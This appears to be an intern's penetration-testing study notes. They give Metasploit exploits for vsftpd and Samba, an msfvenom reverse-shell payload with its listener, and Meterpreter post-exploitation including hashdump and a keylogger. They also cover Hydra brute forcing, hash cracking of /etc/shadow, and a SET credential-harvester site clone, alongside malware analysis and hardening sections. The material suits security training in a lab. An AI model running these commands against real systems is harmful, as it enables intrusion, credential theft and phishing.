# Task 4: Exploitation & System Security
> ApexPlanet Cybersecurity Internship | Days 37–48

---

## 1. Penetration Testing Methodology

### The 5 Phases
```
1. Reconnaissance  → Gather info about target
2. Scanning        → Find open ports and vulnerabilities
3. Exploitation    → Gain unauthorized access
4. Post-Exploitation → Maintain access, gather data
5. Reporting       → Document all findings
```

### Pentest Types
| Type | Knowledge Level | Description |
|------|----------------|-------------|
| **Black Box** | No info | Simulates external attacker |
| **Grey Box** | Partial info | Partial knowledge of system |
| **White Box** | Full info | Full access to source/config |

### Rules of Engagement
- Always get **written authorization** before testing
- Define **scope** — what systems can be tested
- Define **timeline** — when testing can occur
- Document **every step** with timestamps and screenshots

---

## 2. Exploitation with Metasploit

### Metasploit Framework Structure
```
Modules:
  exploit/   → Attack modules
  payload/   → Code to run after exploitation
  auxiliary/ → Scanning, fuzzing, sniffing
  post/      → Post-exploitation modules
  encoder/   → Encode payloads to avoid detection
  nop/       → NOP sled generators
```

### Basic msfconsole Commands
```bash
msfconsole              # Start Metasploit
help                    # Show help
search <term>           # Search for modules
use <module>            # Select a module
show options            # Show module options
show payloads           # Show compatible payloads
set <option> <value>    # Set an option
setg <option> <value>   # Set global option
run / exploit           # Run the exploit
back                    # Go back to main menu
sessions                # List active sessions
sessions -i <id>        # Interact with session
exit                    # Exit msfconsole
```

### Exploit 1 — vsftpd 2.3.4 Backdoor
```bash
# This backdoor was planted in the vsftpd 2.3.4 source code
# Triggered by sending a smiley face ":)" in the username

msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.93.129
run

# Result: root shell on target
id        # uid=0(root)
whoami    # root
```

### Exploit 2 — Samba Usermap Script
```bash
search samba usermap
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.93.129
set LHOST 192.168.93.128    # Kali IP
run

# Result: root shell
```

### Exploit 3 — Reverse Shell with Meterpreter
```bash
# Generate payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=4444 -f elf > shell.elf

# Set up listener
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.93.128
set LPORT 4444
run

# Transfer and execute shell.elf on target
```

### Post-Exploitation Commands
```bash
# Meterpreter commands
sysinfo          # System information
getuid           # Current user
getpid           # Current process ID
ps               # Running processes
hashdump         # Dump password hashes
shell            # Drop to system shell
download file    # Download file from target
upload file      # Upload file to target
screenshot       # Take screenshot
keyscan_start    # Start keylogger
keyscan_dump     # Dump keystrokes

# Standard shell commands after exploitation
id
uname -a                    # OS + kernel version
cat /etc/passwd             # User accounts
cat /etc/shadow             # Password hashes (needs root)
ifconfig                    # Network interfaces
netstat -tulpn              # Open ports/services
ps aux                      # Running processes
find / -perm -4000 2>/dev/null  # SUID files
crontab -l                  # Scheduled tasks
history                     # Command history
```

---

## 3. Password Attacks

### Hydra — Online Brute Force
```bash
# SSH brute force
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.93.129
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://192.168.93.129

# FTP brute force
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.93.129

# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.93.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Multiple usernames + passwords
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.93.129

# Flags
# -l  single username
# -L  username list
# -p  single password
# -P  password list
# -t  threads (default 16)
# -V  verbose (show attempts)
# -s  custom port
```

### John the Ripper — Offline Hash Cracking
```bash
# Prepare hash file (after dumping /etc/shadow)
cat /etc/shadow > hashes.txt

# Crack with default wordlist
john hashes.txt

# Crack with rockyou
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john hashes.txt --show

# Crack specific format
john --format=md5crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=bcrypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Combine hashes (passwd + shadow)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### hashcat — GPU-accelerated Cracking
```bash
# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

# Show results
hashcat -m 0 hash.txt --show
```

---

## 4. Social Engineering (Simulation Only)

### Social Engineering Toolkit (SET)
```bash
setoolkit
# 1 → Social-Engineering Attacks
# 2 → Website Attack Vectors
# 3 → Credential Harvester Attack Method
# 2 → Site Cloner
# Enter IP: 192.168.93.128 (Kali IP)
# Enter URL: https://www.facebook.com
# Phishing page at: http://192.168.93.128
```

### Phishing Awareness — Red Flags to Check
- Mismatched URLs (hover before clicking)
- Urgent language ("Your account will be suspended!")
- Generic greetings ("Dear User")
- Suspicious attachments
- Requests for credentials via email
- Poor grammar/spelling

### Building Awareness
- Never click links in unexpected emails
- Verify sender email address carefully
- Use MFA (Multi-Factor Authentication)
- Report suspicious emails to IT/security team

---

## 5. Malware Basics

### Types of Malware
| Type | Description |
|------|-------------|
| **Virus** | Attaches to files, spreads when file is executed |
| **Worm** | Self-replicates without user action |
| **Trojan** | Disguised as legitimate software |
| **Ransomware** | Encrypts files and demands payment |
| **Spyware** | Secretly monitors user activity |
| **Rootkit** | Hides malware presence at OS level |
| **Keylogger** | Records keystrokes |
| **Botnet** | Network of infected machines controlled remotely |

### Static Analysis (No Execution)
```bash
# File identification
file sample.exe
file sample.elf

# String extraction
strings sample | head -100
strings sample | grep -i "http"
strings sample | grep -i "password"

# Hash identification
md5sum sample
sha256sum sample
# Submit hash to virustotal.com

# ELF analysis (Linux)
readelf -h sample          # ELF header
readelf -S sample          # Section headers
objdump -d sample          # Disassemble

# PE analysis (Windows .exe)
pestr sample.exe
pedump sample.exe
```

### Dynamic Analysis (Sandbox)
```bash
# Monitor system calls
strace ./sample 2>&1 | tee strace-output.txt

# Monitor library calls
ltrace ./sample 2>&1 | tee ltrace-output.txt

# Network monitoring during execution
tcpdump -i eth0 -w malware-traffic.pcap &
./sample
# Stop tcpdump with Ctrl+C
# Analyze .pcap in Wireshark

# Online sandboxes:
# https://any.run
# https://www.hybrid-analysis.com
# https://app.triage.io
```

---

## 6. System Hardening

### UFW Firewall (Kali/Ubuntu)
```bash
# Enable firewall
ufw enable

# Allow/deny services
ufw allow ssh
ufw allow http
ufw allow https
ufw deny telnet
ufw deny 23/tcp
ufw deny 21/tcp

# Allow from specific IP
ufw allow from 192.168.93.128 to any port 22

# Check status
ufw status verbose

# Disable
ufw disable
```

### SSH Hardening
```bash
nano /etc/ssh/sshd_config

# Change these settings:
PermitRootLogin no              # Disable root login
PasswordAuthentication no       # Require key-based auth
MaxAuthTries 3                  # Limit login attempts
Protocol 2                      # Use SSH v2 only
Port 2222                       # Change default port

# Restart SSH
systemctl restart ssh
```

### Disable Unused Services
```bash
# List running services
systemctl list-units --type=service --state=running

# Disable dangerous services
systemctl stop telnet
systemctl disable telnet
systemctl stop ftp
systemctl disable vsftpd

# Check open ports
netstat -tulpn
ss -tulpn
```

### Find Privilege Escalation Risks
```bash
# SUID binaries (run as owner, not user)
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -perm -o+w -type f 2>/dev/null

# World-writable directories
find / -perm -o+w -type d 2>/dev/null

# Files owned by root but writable by all
find / -user root -perm -o+w 2>/dev/null
```

### Apply Security Patches
```bash
apt update
apt upgrade -y
apt dist-upgrade -y
apt autoremove -y

# Check for specific CVE patches
apt changelog <package>
```

---

## Key Concepts Summary

| Concept | One-liner |
|---------|-----------|
| **Exploit** | Code that takes advantage of a vulnerability |
| **Payload** | Code that runs after successful exploitation |
| **Shell** | Command-line access to a compromised system |
| **Reverse Shell** | Target connects back to attacker |
| **Bind Shell** | Attacker connects to target's open port |
| **Meterpreter** | Advanced Metasploit payload with many features |
| **Privilege Escalation** | Gaining higher access (user → root) |
| **Persistence** | Maintaining access after reboot |
| **Lateral Movement** | Moving to other systems in the network |
| **Hashdump** | Extracting password hashes from system |
| **SUID** | Binary that runs with owner's privileges |
| **Brute Force** | Systematically trying all possible passwords |
| **Dictionary Attack** | Using a wordlist to crack passwords |
| **Rainbow Table** | Precomputed hash lookup table |
| **Salted Hash** | Hash with random data added to prevent rainbow tables |

---

*Notes by Manivel R | ApexPlanet Cybersecurity Internship 2026*
